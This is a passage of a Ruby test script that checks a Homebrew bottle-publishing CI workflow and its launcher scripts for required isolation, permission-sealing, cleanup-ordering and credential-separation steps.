    'printf \' "${bottle_tag_env[@]}" "$command_path" "$@"\\n\'',
    "__kandelo_verify_source_aliases", "/usr/bin/findmnt",
    '"$sudo_bin" install -o root -g root -m 0555 "$wrapper_source" "$wrapper_path"',
    '/usr/bin/find "$config_root" -xdev -type d',
    '/usr/bin/find "$config_root" -xdev -type f',
    '-exec chmod 0555 {} +',
    '-exec chmod 0444 {} +',
    'trust_file="$XDG_CONFIG_HOME/homebrew/trust.json"',
    'trust_lock="${trust_file}.lock"',
    '"0:0:444:1"',
    'trust-store files must use distinct private inodes',
    'isolated trust-store access is unsafe',
    'homebrew_patched_launcher_seed_bundler_groups',
    'install-bundler-gems --groups="$groups_csv"',
    '.homebrew_gem_groups', '.homebrew_vendor_version',
    'Bundler groups must be unique',
    'cannot seed Bundler groups after isolation',
    'homebrew_assert_tree_symlinks_contained "$sysroot" sysroot',
    'homebrew_assert_tree_not_replaceable_by_user "$build_user" "$sysroot"',
    '"$build_user" "$HOMEBREW_KANDELO_GNU_TAR"',
    '"$HOMEBREW_KANDELO_GNU_TAR" "Nix GNU tar" || return',
    'homebrew_assert_tree_not_replaceable_by_user \
      "$build_user" "$HOMEBREW_KANDELO_GNU_TAR" || return',
    'sysroot_access_violation="$(/usr/bin/find "$expected_sysroot" -xdev',
    'protected sysroot alias has unsafe access',
    'sysroot build root cannot be inside mutable Formula state',
    'mutable Formula state cannot be inside the sysroot build root',
    'homebrew_patched_launcher_seal_overlay',
    'homebrew_patched_launcher_assert_overlay_symlinks_contained',
    'overlay symlink crosses its worktree',
    'overlay symlink escapes its worktree',
    '/usr/bin/realpath -m -s -- "$lexical_input"',
    '/usr/bin/realpath -- "$link"',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealing"',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealed"',
    'homebrew_patched_launcher_verify_overlay_seal',
    'homebrew_patched_launcher_restore_overlay_for_cleanup',
    'homebrew_patched_launcher_worktree_registration_status',
    'worktree list --porcelain',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="cleanup-ready"',
    '"$HOMEBREW_PATCHED_OVERLAY" -xdev -type f -perm /0111',
    '-exec /usr/bin/chmod 0444 {} +',
    'refusing to restore the overlay before Formula process teardown',
    'Homebrew overlay registration could not be verified; preserving launcher state for retry',
    'Homebrew overlay removal failed; preserving launcher state for retry',
    'EXTRA_PATCH_FILE',
    'git -C "$HOMEBREW_PATCHED_OVERLAY" apply --check "$extra_patch_file"',
    "-writable -print -quit", "! -readable -o ! -executable", "-prune",
    "homebrew_patched_launcher_uid_has_processes", "homebrew_patched_launcher_teardown",
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- "$HOMEBREW_PATCHED_PGREP_BIN"',
    '-KILL -u "$HOMEBREW_PATCHED_BUILD_UID"',
    "could not inspect Formula build identity processes",
    "Formula build identity still owns live processes",
    "homebrew_patched_launcher_native_prefix_path",
    "native prefix base leaves no room for an exact Linuxbrew relocation path",
    "homebrew_patched_launcher_prepare_native_prefix",
    "expected PREFIX CACHE TEMP CONFIG HOME",
    'native_inputs=("$native_prefix" "$native_cache" "$native_temp" "$native_config" "$native_home")',
    'chmod 0700 "$path"',
    'HOME="$HOMEBREW_PATCHED_NATIVE_HOME"',
    '/home/linuxbrew/.linuxbrew/Cellar',
    'must exactly match fixed-prefix Linuxbrew bottle path lengths',
    'HOMEBREW_RELOCATE_BUILD_PREFIX=1',
    '"--property=BindReadOnlyPaths=$HOMEBREW_PATCHED_NATIVE_PREFIX"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_CACHE"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_TEMP"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_CONFIG"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_HOME"',
    '"--property=BindReadOnlyPaths=$work_dir"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_PREFIX"',
    '"--property=InaccessiblePaths=$HOMEBREW_CACHE"',
    '"--property=InaccessiblePaths=$HOMEBREW_TEMP"',
    '"--property=InaccessiblePaths=$XDG_CONFIG_HOME"',
    '"--property=InaccessiblePaths=$build_home"',
    '"$sudo_bin" /usr/bin/install -o root -g root -m 0500',
    '/usr/bin/realpath -- "$current"',
    'homebrew_patched_launcher_seal_native_prefix',
    '/usr/bin/chown -hR root:root',
    '-type d -exec /usr/bin/chmod 0555 {} +',
    "-type f \\\n      -exec /usr/bin/chmod a-w,u-s,g-s {} +",
    'homebrew_patched_launcher_bridge_native_formula',
    'homebrew_patched_launcher_rewrite_native_bridge_links',
    'native Formula cross-keg link is unresolved',
    '"$rm_bin" -f -- "$target_link"',
    '"$ln_bin" -s -- "$resolved" "$target_link"',
    'homebrew_patched_launcher_remove_native_bridges',
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES+=("$formula")',
    'native Formula bridge creation failed; rolling back',
    'native Formula bridge rollback failed; preserving launcher state for retry',
    'Formula process teardown failed; preserving launcher state for retry',
    'return "$teardown_status"',
    'for protected_bin in chmod chown cmp cp id install ln ls mktemp readlink rm stat test; do',
    '"$sudo_bin" /usr/bin/install -d -o root -g "$build_group" -m 1775',
    '"$(/usr/bin/stat -c \'%u:%g:%a\' "$target_state_root")" = "0:$build_gid:1775"',
    'target_opt_target="../Cellar/$formula/$native_version"',
    '"$native_opt_target/." "$target_keg/"',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/cp -R -p',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/chown -hR root:root',
    '"$target_rack" -xdev -type d -exec /usr/bin/chmod 0555 {} +',
    '[ ! -d "$target_keg" ] || [ -L "$target_keg" ]',
    'native Formula has a symlink that cannot be safely relocated',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/ln -s',
  ].each do |fragment|
    check(launcher.include?(fragment), "isolated Brew launcher lacks #{fragment}")
  end
  check(!launcher.include?('homebrew_assert_tree_not_writable_by_user "$build_user" "$sysroot"'),
        "isolated Brew launcher requires pre-bind access to the protected sysroot owner path")
  check(launcher.scan("homebrew_patched_launcher_emit_sysroot_access_audit").length == 2,
        "isolated Brew launcher does not emit its reviewed sysroot alias audit exactly once")
  check(launcher.include?(
          "homebrew_patched_launcher_isolate: expected BUILD_USER WORK_DIR " \
          "KANDELO_ROOT TAP_ROOT OUTPUT_ROOT SYSROOT_BUILD_ROOT"
        ), "isolated Brew launcher does not require an explicit sysroot build root")
  check(launcher.scan('"--property=InaccessiblePaths=$sysroot_build_root"').length == 2,
        "isolated target and native Homebrew do not both hide the sysroot build root")
  [
    'HOMEBREW_PATCHED_STAGED_INPUT_SHARED_TEMP=""',
    'HOMEBREW_PATCHED_STAGED_INPUT_DIR=""',
    'HOMEBREW_PATCHED_STAGED_INPUT_PATH=""',
    'homebrew_patched_launcher_remove_staged_input()',
    'protected input cleanup state is incomplete',
    'protected input cleanup path left its shared root',
    'could not remove protected input; preserving cleanup state for retry',
    'homebrew_patched_launcher_stage_protected_input()',
    'expected BUILD_USER SHARED_TEMP SOURCE BASENAME',
    '[ "$build_user" != "$HOMEBREW_PATCHED_BUILD_USER" ]',
    '[ ! -f "$source" ] || [ -L "$source" ]',
    '[ "${#basename}" -gt 512 ]',
    'protected input shared temp must be root-owned mode 1777',
    '"$shared_temp/homebrew-bottle-input.XXXXXX"',
    'a protected input is already registered',
    'HOMEBREW_PATCHED_STAGED_INPUT_SHARED_TEMP="$shared_temp"',
    'HOMEBREW_PATCHED_STAGED_INPUT_DIR="$protected_dir"',
    'HOMEBREW_PATCHED_STAGED_INPUT_PATH="$protected_path"',
    '-o root -g root -m 0444 -- "$source" "$protected_path"',
    '/usr/bin/chown root:root',
    '/usr/bin/chmod 0555',
    '"0:0:555"',
    '"0:0:444:1"',
    '[ "$source" -ef "$protected_path" ]',
    '/usr/bin/cmp -s -- "$source" "$protected_path"',
    '/usr/bin/test -r "$protected_path"',
    '/usr/bin/test -w "$protected_path"',
    '/usr/bin/test -w "$protected_dir"',
    '/usr/bin/rm -rf --',
    'if ! homebrew_patched_launcher_remove_staged_input; then',
    'protected input remains; preserving launcher state for retry',
  ].each do |fragment|
    check(launcher.include?(fragment),
          "protected Formula input staging lacks #{fragment}")
  end
  staged_cleanup_owner_index = launcher.index("homebrew_patched_launcher_cleanup()")
  staged_cleanup_teardown_index = launcher.index(
    'homebrew_patched_launcher_teardown "$HOMEBREW_PATCHED_BUILD_USER"',
    staged_cleanup_owner_index
  )
  staged_cleanup_remove_index = launcher.index(
    'if ! homebrew_patched_launcher_remove_staged_input; then',
    staged_cleanup_owner_index
  )
  staged_cleanup_reset_index = launcher.index(
    'HOMEBREW_PATCHED_SUDO_BIN=""', staged_cleanup_owner_index
  )
  check(staged_cleanup_owner_index && staged_cleanup_teardown_index &&
        staged_cleanup_remove_index && staged_cleanup_reset_index &&
        staged_cleanup_teardown_index < staged_cleanup_remove_index &&
        staged_cleanup_remove_index < staged_cleanup_reset_index,
        "protected Formula input is not removed after teardown and before launcher reset")
  check(launcher.scan("HOMEBREW_RELOCATE_BUILD_PREFIX=1").length == 2,
        "isolated Brew launcher does not own both native relocation paths")
  bridge_registration_index = launcher.index(
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES+=("$formula")'
  )
  bridge_first_mutation_index = launcher.index(
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/install -d',
    bridge_registration_index
  )
  bridge_rollback_index = launcher.index(
    'native Formula bridge creation failed; rolling back',
    bridge_registration_index
  )
  check(bridge_registration_index && bridge_first_mutation_index && bridge_rollback_index &&
        bridge_registration_index < bridge_first_mutation_index &&
        bridge_first_mutation_index < bridge_rollback_index,
        "native Formula proxies are not registered before their first mutation")
  bridge_cleanup_index = launcher.index("homebrew_patched_launcher_remove_native_bridges()")
  bridge_cleanup_opt_index = launcher.index('/usr/bin/rm -f --',
                                             bridge_cleanup_index)
  bridge_cleanup_rack_index = launcher.index('/usr/bin/rm -rf --',
                                              bridge_cleanup_index)
  check(bridge_cleanup_index && bridge_cleanup_opt_index && bridge_cleanup_rack_index &&
        bridge_cleanup_opt_index < bridge_cleanup_rack_index,
        "native Formula proxy cleanup does not remove opt before its rack")
  check(!launcher.include?('ln -s "$native_rack"') &&
        !launcher.include?('ln -s "$native_opt"'),
        "native Formula proxy uses a rack symlink that Homebrew rejects as a keg")
  cleanup_index = launcher.index("homebrew_patched_launcher_cleanup()")
  teardown_preserve_index = launcher.index(
    "Formula process teardown failed; preserving launcher state for retry",
    cleanup_index
  )
  cleanup_bridge_index = launcher.index(
    "if ! homebrew_patched_launcher_remove_native_bridges; then",
    cleanup_index
  )
  cleanup_state_clear_index = launcher.index(
    'HOMEBREW_PATCHED_SUDO_BIN=""',
    cleanup_index
  )
  check(cleanup_index && teardown_preserve_index && cleanup_bridge_index &&
        cleanup_state_clear_index && teardown_preserve_index < cleanup_bridge_index &&
        cleanup_bridge_index < cleanup_state_clear_index,
        "Formula teardown failure does not preserve launcher state before cleanup")
  seal_function_index = launcher.index("homebrew_patched_launcher_seal_overlay()")
  seal_state_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealing"', seal_function_index
  )
  seal_mode_index = launcher.index(
    '-exec /usr/bin/chmod 0555 {} +', seal_state_index
  )
  sealed_state_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealed"', seal_mode_index
  )
  isolate_index = launcher.index("homebrew_patched_launcher_isolate()")
  isolate_seal_index = launcher.index(
    'homebrew_patched_launcher_seal_overlay "$build_user"', isolate_index
  )
  isolate_integrity_index = launcher.index(
    'HOMEBREW_PATCHED_INTEGRITY_SHA256=', isolate_seal_index
  )
  check(seal_function_index && seal_state_index && seal_mode_index &&
        sealed_state_index && isolate_seal_index && isolate_integrity_index &&
        seal_state_index < seal_mode_index && seal_mode_index < sealed_state_index &&
        isolate_seal_index < isolate_integrity_index,
        "Homebrew overlay sealing is not registered before mode changes and integrity capture")
  cleanup_restore_index = launcher.index(
    "homebrew_patched_launcher_restore_overlay_for_cleanup", cleanup_index
  )
  cleanup_worktree_remove_index = launcher.index(
    "worktree remove --force", cleanup_restore_index
  )
  cleanup_overlay_state_clear_index = launcher.index(
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE=""', cleanup_worktree_remove_index
  )
  check(cleanup_restore_index && cleanup_worktree_remove_index &&
        cleanup_overlay_state_clear_index &&
        teardown_preserve_index < cleanup_restore_index &&
        cleanup_restore_index < cleanup_worktree_remove_index &&
        cleanup_worktree_remove_index < cleanup_overlay_state_clear_index,
        "Homebrew overlay cleanup does not restore only after teardown and clear after removal")
  check(!launcher.include?('chmod 0660 "$trust_lock"') &&
        !launcher.include?('chown "root:$build_group" "$trust_lock"'),
        "isolated Brew launcher leaves the trust lock writable")
  target_environment = launcher[/\n  preserved_variables=\((.*?)\n  \)/m, 1]
  check(target_environment&.include?("HOMEBREW_KANDELO_GNU_TAR"),
        "isolated target Homebrew drops the validated GNU tar path")
  native_environment = launcher[/native_preserved_variables=\((.*?)\n  \)/m, 1]
  check(native_environment &&
        !native_environment.match?(/KANDELO|HOMEBREW_CACHE|HOMEBREW_TEMP|XDG_CONFIG_HOME|LLVM|GNU_TAR/),
        "isolated native Homebrew inherits target-only state or Kandelo controls")
  gnu_tar_executable_index = launcher.index(
    '"$HOMEBREW_KANDELO_GNU_TAR" "Nix GNU tar" || return'
  )
  gnu_tar_tree_index = launcher.index(
    '"$build_user" "$HOMEBREW_KANDELO_GNU_TAR" || return',
    gnu_tar_executable_index
  )
  check(gnu_tar_executable_index && gnu_tar_tree_index &&
        gnu_tar_executable_index < gnu_tar_tree_index,
        "GNU tar ancestor replacement protection does not follow executable validation")
  launcher_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-patched-launcher.sh")
  )
  check(launcher_test.include?("assert-protected-gnu-tar") &&
        launcher_test.include?('[ ! -w "$2" ] && [ ! -w "${2%/*}" ]'),
        "launcher regression does not exercise GNU tar as the dedicated Formula identity")
  native_validation_index = launcher.index('native_inputs=("$native_prefix"')
  native_overlap_index = launcher.index(
    "Homebrew state roots must not contain one another"
  )
  native_create_index = launcher.index('for path in "${native_roots[@]}"; do')
  check(native_validation_index && native_overlap_index && native_create_index &&
        native_validation_index < native_overlap_index &&
        native_overlap_index < native_create_index,
        "native Homebrew mutates roots before validating realm separation")
  [
    "remaining_bridges=()",
    'remaining_bridges+=("$formula")',
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES=("${remaining_bridges[@]}")',
    "if ! homebrew_patched_launcher_remove_native_bridges; then",
    "native Formula bridges remain; preserving launcher state for retry",
  ].each do |fragment|
    check(launcher.include?(fragment),
          "native bridge cleanup retry contract lacks #{fragment}")
  end
  teardown_index = bottle_builder.index('homebrew_patched_launcher_teardown "$BUILD_USER"')
  artifact_index = bottle_builder.index("mapfile -t bottle_jsons")
  check(teardown_index && artifact_index && teardown_index < artifact_index,
        "reviewed bottle builder reads artifacts before Formula process teardown")
  runtime_step = named_step(build_steps, "Materialize Formula test platform runtime")
  check(runtime_step.keys.sort == %w[name run shell] && runtime_step["shell"] == "bash",
        "publisher Formula test runtime mapping changed")
  runtime_run = runtime_step.fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", 'host="$(rustc -vV | sed -n "s/^host: //p")"',
    "for package in dash coreutils grep sed rootfs", 'cargo run --release -p xtask --target "$host" --quiet --',
    "build-deps --arch wasm32", '--binaries-dir "$PWD/binaries"', '--fetch-only resolve "$package"',
    'bash scripts/materialize-resolver-binaries.sh "$PWD/binaries"',
  ].each do |fragment|
    check(runtime_run.include?(fragment), "publisher Formula test runtime lacks #{fragment}")
  end
  materializer = File.read(File.join(REPO_ROOT, "scripts/materialize-resolver-binaries.sh"))
  [
    'cp -aLx -- "$source_dir" "$staged"',
    '! \\( -type d -o -type f \\)',
    'find "$source_dir" -xdev -type d -exec chmod 0555 {} +',
    'find "$source_dir" -xdev -type f -exec chmod 0444 {} +',
    'original_move_started=1',
    'mv "$source_dir" "$backup"',
    'mv "$staged" "$source_dir"',
    'rollback failed; preserving $transaction',
  ].each do |fragment|
    check(materializer.include?(fragment),
          "publisher Formula runtime materialization lacks #{fragment}")
  end
  check_architecture_aware_sysroot_step(
    named_step(build_steps, "Build Kandelo sysroot"), "publisher build"
  )
  verifier_sysroot_step = named_step(
    verify_steps, "Build Kandelo sysroot for sidecar evidence"
  )
  check_architecture_aware_sysroot_step(verifier_sysroot_step, "publisher verifier")
  verifier_sysroot_run = verifier_sysroot_step.fetch("run")
  [
    'expected_sha="$(git -C kandelo rev-parse HEAD)"',
    'git -C kandelo-sysroot-build rev-parse HEAD',
    'git -C kandelo-sysroot-build status --short',
    "cd kandelo-sysroot-build",
  ].each do |fragment|
    check(verifier_sysroot_run.include?(fragment),
          "publisher verifier sysroot isolation lacks #{fragment}")
  end
  check(!verifier_sysroot_run.lines.any? { |line| line.strip == "cd kandelo" },
        "publisher verifier builds its mutable sysroot in the reviewed source checkout")
  kernel_step = named_step(build_steps, "Build Kandelo kernel")
  fork_instrument_step = named_step(build_steps, "Build fork-instrument host tool")
  check(fork_instrument_step.keys.sort == %w[name run shell] &&
        fork_instrument_step["shell"] == "bash" &&
        fork_instrument_step.fetch("run").include?("cd kandelo") &&
        fork_instrument_step.fetch("run").include?(
          "bash scripts/dev-shell.sh bash scripts/build-fork-instrument-tool.sh"
        ), "publisher does not build the reviewed fork-instrument host tool")
  javascript_step = named_step(build_steps, "Install JavaScript dependencies for formula tests")
  browser_fragments = [
    'cd "$GITHUB_WORKSPACE/kandelo"', "bash scripts/dev-shell.sh env",
    'KANDELO_HOMEBREW_SHARED_TEMP="$KANDELO_HOMEBREW_SHARED_TEMP"',
    'KANDELO_HOMEBREW_BUILD_USER="$KANDELO_HOMEBREW_BUILD_USER"',
    'KANDELO_HOMEBREW_SUDO_BIN="$KANDELO_HOMEBREW_SUDO_BIN"',
    'node_bin="$(command -v node)"', "/nix/store/*/bin/node",
    "Formula browser provisioning resolved an undeclared Node",
    "bash scripts/homebrew-provision-formula-browser.sh",
    '--shared-temp "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--build-user "$KANDELO_HOMEBREW_BUILD_USER"',
    '--sudo-bin "$KANDELO_HOMEBREW_SUDO_BIN"', '--node-bin "$node_bin"',
    '--browser-app "$PWD/apps/browser-demos"',
  ]
  check_browser_step = lambda do |steps, name, label|
    step = named_step(steps, name)
    check(step.keys.sort == %w[name run shell] && step["shell"] == "bash",
          "#{label} Formula browser runtime mapping changed")
    run = step.fetch("run")
    browser_fragments.each do |fragment|
      check(run.include?(fragment), "#{label} Formula browser runtime lacks #{fragment}")
    end
    dev_shell_index = run.index("bash scripts/dev-shell.sh env")
    node_resolution_index = run.index('node_bin="$(command -v node)"')
    check(dev_shell_index && node_resolution_index && dev_shell_index < node_resolution_index,
          "#{label} resolves Formula browser Node from the hosted runner PATH")
    step
  end
  browser_step = check_browser_step.call(
    build_steps, "Provision Formula browser runtime", "publisher build"
  )
  verify_browser_step = check_browser_step.call(
    verify_steps, "Provision Formula browser runtime for bottle verification",
    "publisher verifier"
  )
  browser_provisioner = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-provision-formula-browser.sh")
  )
  [
    'BROWSER_CACHE="$SHARED_TEMP/ms-playwright"',
    '[ -e "$BROWSER_CACHE" ] || [ -L "$BROWSER_CACHE" ]',
    'PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    'HOST_SYSTEM_PATH="$(dirname "$SUDO_BIN"):/usr/sbin:/usr/bin:/sbin:/bin"',
    'PATH="$PATH:$HOST_SYSTEM_PATH" PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    '"$NODE_BIN" "$PLAYWRIGHT_CLI" install chromium --with-deps',
    'requireFromBrowserApp("@playwright/test")',
    '"$SUDO_BIN" -n -- chown -R root:root "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -- chmod -R a-w "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -H -u "$BUILD_USER" --',
    'test -w "$BROWSER_CACHE" -o -w "$BROWSER_EXECUTABLE"',
    "Playwright Chromium escaped its cache",
  ].each do |fragment|
    check(browser_provisioner.include?(fragment),
          "reviewed Formula browser provisioner lacks #{fragment}")
  end
  verifier_identity_step = named_step(
    verify_steps, "Create isolated bottle verification identity"
  )
  force_pour_step = named_step(
    verify_steps, "Force-pour and test the exact selected bottle without credentials"
  )
  force_pour_run = force_pour_step.fetch("run")
  protected_sysroot_argument =
    '--sysroot-build-root "$GITHUB_WORKSPACE/kandelo-sysroot-build"'
  check(force_pour_run.scan(protected_sysroot_argument).length == 1 &&
        !force_pour_run.include?('--sysroot-build-root "$GITHUB_WORKSPACE/kandelo"') &&
        !force_pour_run.include?('--sysroot-build-root "$KANDELO_ROOT"'),
        "publisher verifier does not expose the isolated sysroot build through its exact root")
  check(verify_steps.index(verifier_sysroot_step) < verify_steps.index(force_pour_step),
        "publisher verifies a bottle before building its protected sysroot")
  verifier_retirement_step = named_step(
    verify_steps, "Retire isolated bottle verification identity"
  )
  check(verify_steps.index(verifier_identity_step) < verify_steps.index(verify_browser_step) &&
        verify_steps.index(verify_browser_step) < verify_steps.index(force_pour_step) &&
        verify_steps.index(force_pour_step) < verify_steps.index(verifier_retirement_step),
        "publisher provisions or uses the verifier browser outside the isolated test phase")
  build_formula_step = named_step(build_steps,
                                  "Build and test Homebrew bottle without publisher credentials")
  retire_identity_step = named_step(build_steps, "Retire isolated Formula execution identity")
  check(retire_identity_step.keys.sort == %w[if name run shell] &&
        retire_identity_step["if"] ==
          "${{ always() && steps.formula-identity.outputs.created == 'true' }}" &&
        retire_identity_step["shell"] == "bash",
        "publisher Formula execution identity retirement mapping changed")
  retire_identity_run = retire_identity_step.fetch("run")
  [
    '"$sudo_bin" -n -- "$pgrep_bin" -u "$build_uid"',
    '"$sudo_bin" -n -- "$pkill_bin" -KILL -u "$build_uid"',
    '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"',
    "could not inspect Formula build identity processes",
    "Formula build identity still exists after retirement",
  ].each do |fragment|
    check(retire_identity_run.include?(fragment),
          "publisher Formula execution identity retirement lacks #{fragment}")
  end
  postbuild_kandelo_step = named_step(
    build_steps, "Checkout exact post-build Kandelo validator source"
  )
  postbuild_tap_step = named_step(build_steps, "Checkout exact post-build tap source")
  source_closure_step = named_step(build_steps,
                                   "Recheck reviewed sources after Formula execution")
  source_closure_run = source_closure_step.fetch("run")
  [
    "scripts/homebrew-validate-formula-source-closure.sh",
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    'git -C "$GITHUB_WORKSPACE/kandelo-postbuild" rev-parse HEAD',
    'git -C "$GITHUB_WORKSPACE/tap-reviewed" rev-parse HEAD',
    '--tap-root "$GITHUB_WORKSPACE/tap"', '--tap-repository "$TAP_REPOSITORY"',
    '--tap-name "$TAP_NAME"',
    '--formula "$FORMULA"', '--base-ref "$TAP_SHA"',
    '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
  ].each do |fragment|
    check(source_closure_run.include?(fragment),
          "publisher Formula source-closure check lacks #{fragment}")
  end
  check(build_steps.index(kernel_step) < build_steps.index(fork_instrument_step) &&
        build_steps.index(fork_instrument_step) < build_steps.index(runtime_step) &&
        build_steps.index(runtime_step) < build_steps.index(javascript_step) &&
        build_steps.index(javascript_step) < build_steps.index(identity_step) &&
        build_steps.index(identity_step) < build_steps.index(browser_step) &&
        build_steps.index(browser_step) < build_steps.index(build_formula_step) &&
        build_steps.index(runtime_step) < build_steps.index(build_formula_step) &&
        build_steps.index(build_formula_step) < build_steps.index(retire_identity_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_kandelo_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_tap_step) &&
        build_steps.index(postbuild_kandelo_step) < build_steps.index(source_closure_step) &&
        build_steps.index(postbuild_tap_step) < build_steps.index(source_closure_step) &&
        build_steps.index(build_formula_step) < build_steps.index(source_closure_step),
        "publisher Formula test runtime is materialized outside the unprivileged pre-test phase")
  create_handoff_run = named_step(build_steps, "Create strict bottle data handoff").fetch("run")
  check(build_steps.index(source_closure_step) <
        build_steps.index(named_step(build_steps, "Create strict bottle data handoff")),
        "publisher creates the bottle handoff before revalidating Formula sources")
  [
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    '. "$RUNNER_TEMP/homebrew-bottle/build.env"',
    "scripts/homebrew-create-build-handoff.sh", '--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"',
    '--tap-name "$KANDELO_HOMEBREW_TAP_NAME"',
    '--bottle "$BOTTLE_ARCHIVE"', '--bottle-json "$BOTTLE_JSON"',
    '--dependency-provenance "$DEPENDENCY_PROVENANCE"',
    '--out "$RUNNER_TEMP/homebrew-build-handoff"',
  ].each do |fragment|
    check(create_handoff_run.include?(fragment), "publisher build handoff lacks #{fragment}")
  end
  check_forbidden_root_args(create_handoff_run, "publisher build handoff", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--forbidden-root "$HOMEBREW_TEMP"',
    '--forbidden-root "$NATIVE_BUILD_ROOT"',
    '--forbidden-root "/home/$KANDELO_HOMEBREW_BUILD_USER"',
  ])
  compose_child = named_step(
    build_steps, "Compose deterministic Homebrew OCI child without credentials"
  )
  compose_child_run = compose_child.fetch("run")
  [
    "credential-free OCI composer received $secret_name",
    "scripts/homebrew-validate-build-handoff.sh",
    "scripts/homebrew-oci-layout.py build-child",
    '--tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
    '--kandelo-root "$GITHUB_WORKSPACE/kandelo-postbuild"',
    '--out-layout "$artifact/layout"', '--out-receipt "$artifact/receipt.json"',
  ].each do |fragment|
    check(compose_child_run.include?(fragment),
          "publisher deterministic OCI child composition lacks #{fragment}")
  end
  check_forbidden_root_args(compose_child_run, "publisher OCI child composition", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ])
  check(build_steps.index(source_closure_step) < build_steps.index(compose_child) &&
        build_steps.index(named_step(build_steps, "Create strict bottle data handoff")) <
          build_steps.index(compose_child) &&
        build_steps.index(compose_child) <
          build_steps.index(named_step(build_steps, "Upload deterministic Homebrew OCI child")),
        "publisher composes or exports the OCI child outside the reviewed data phase")

  upload_validate = named_step(upload_steps,
                               "Validate build data before exposing upload credentials")
  upload_attempt = named_step(upload_steps, "Upload validated bottle in isolated ORAS auth state")
  check(upload_validate["id"] == "validate-build" &&
        upload_attempt["if"] == "${{ steps.validate-build.outcome == 'success' }}" &&
        upload_steps.index(upload_validate) < upload_steps.index(upload_attempt),
        "publisher exposes upload credentials before validating the handoff")
  check(upload_validate.fetch("run").include?("scripts/homebrew-validate-build-handoff.sh") &&
        upload_validate.fetch("run").include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
        upload_validate.fetch("run").include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
        upload_attempt.fetch("run").include?("scripts/homebrew-ghcr-upload.sh") &&
        upload_attempt.fetch("run").include?('--tap-name "$KANDELO_HOMEBREW_TAP_NAME"') &&
        upload_attempt.fetch("run").include?("--auth-mode github-token") &&
        upload_attempt.fetch("run").include?("--require-pat false") &&
        upload_attempt.fetch("run").include?("--destination-mode repository") &&
        upload_attempt.fetch("run").include?('--out-json "$RUNNER_TEMP/homebrew-upload-receipt/receipt.json"'),
        "publisher isolated upload path changed")
  ghcr_uploader_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-ghcr-upload.sh"))
  [
    'AUTH_MODE="automatic"',
    'REQUIRE_PAT="false"',
    'DESTINATION_MODE="repository"',
    'repository) REMOTE="ghcr.io/${NORMALIZED_TAP_REPOSITORY}/${FORMULA}" ;;',
  ].each do |fragment|
    check(ghcr_uploader_source.include?(fragment),
          "publisher GHCR transport lacks #{fragment}")
  end
  check(!ghcr_uploader_source.include?(
          'tap) REMOTE="ghcr.io/${TAP_NAME}/${FORMULA}"'
        ), "publisher GHCR transport retains a tap-name-rooted production destination")
  trusted_runner_roots = [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ]
  check_forbidden_root_args(upload_validate.fetch("run"),
                            "publisher uploader handoff validation", trusted_runner_roots)
  upload_receipt_validation = named_step(upload_steps, "Revalidate upload receipt as data")
  check_forbidden_root_args(upload_receipt_validation.fetch("run"),
                            "publisher uploader receipt validation", trusted_runner_roots)
  build_handoff_validator = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-validate-build-handoff.sh")
  )
  inspector_call = 'python3 "$SCRIPT_ROOT/homebrew-inspect-bottle.py"'
  output_start = 'if [ -n "$OUT_BOTTLE_JSON" ]; then'
  check(build_handoff_validator.include?(inspector_call) &&
        build_handoff_validator.include?('--expected-abi "$EXPECTED_ABI"') &&
        build_handoff_validator.include?('--expected-arch "$ARCH"') &&
        build_handoff_validator.include?('inspection_args+=(--forbidden-root "$forbidden_root")') &&
        build_handoff_validator.include?(
